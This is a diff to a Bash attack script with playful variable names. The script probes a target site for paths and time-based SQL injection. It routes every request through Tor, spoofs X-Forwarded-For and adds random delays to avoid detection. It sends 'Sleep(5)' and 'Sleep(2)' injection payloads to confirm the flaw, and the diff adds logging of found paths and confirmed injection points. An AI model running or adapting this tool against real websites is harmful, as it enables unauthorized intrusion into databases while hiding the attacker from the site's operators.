@@ -10,13 +10,20 @@ echo -e "\e[0;33m[\e[0m!\e[0;33m]\e[0m You just toggle on risk mode.. So, as i p
 echo ""
 sleep 3
 # Dramatic function.
-ROOT_LOG_FILE="$(dirname "$0")/../target.log"
+ROOT_LOG_FILE="$(dirname "$0")/../Target.log"
 Chicken() {
     local crispy_thigh="$1"
     echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Scanning $target_url/$crispy_thigh ( Mode RISK )"
-    curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$target_url/$crispy_thigh" --stderr - | grep "< HTTP"
+    local http_response=$(curl --socks5-hostname 127.0.0.1:9050 -m 5 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -Iv "$target_url/$crispy_thigh" --stderr - | grep "< HTTP")
+    echo "$http_response"
+
+    if echo "$http_response" | grep -q "200"; then
+        echo "FOUND_200|/$crispy_thigh" >> "$ROOT_LOG_FILE"
+    fi
+    
     sleep $((2 + RANDOM % 3))
 }
+
 # Gotta be minimalist below, he is a talkative guy.
 time_audit_engine() {
     local extra_spicy_sauce="$1"
@@ -24,12 +31,15 @@ time_audit_engine() {
     local secret_msg_powder="${extra_spicy_sauce}Sleep(5)))v)--+"
     local stopwatch_seconds=$(curl --socks5-hostname 127.0.0.1:9050 -m 12 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$secret_msg_powder")
     echo -e "[i] Total Response Time: \e[0;32m${stopwatch_seconds}s\e[0m"
+    
     if (( $(echo "$stopwatch_seconds > 5.0" | bc -l) )); then
         local warm_rice_bowl="${extra_spicy_sauce}Sleep(2)))v)--+"
         local wash_hands_now=$(curl --socks5-hostname 127.0.0.1:9050 -m 8 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$warm_rice_bowl")
+        
         if (( $(echo "$wash_hands_now > 2.0" | bc -l) )) && (( $(echo "$wash_hands_now < 4.0" | bc -l) )); then
             echo -e "[i] Time-Delay Matrix: First Check (${stopwatch_seconds}s) | Second Check (${wash_hands_now}s)"
             echo -e "\e[0;31m[!+!] ALERT: 'Confirmed' Genuine Time Based Vulnerability!\e[0m"
+            echo "SQLI_ALERT|${extra_spicy_sauce}" >> "$ROOT_LOG_FILE"
         else
             echo -e "[i] Time-Delay Matrix: First Check (${stopwatch_seconds}s) | Second Check (${wash_hands_now}s)"
             echo -e "\e[0;33m[-] Status: False postive, neither network lag or server defense mechanism detected.\e[0m"
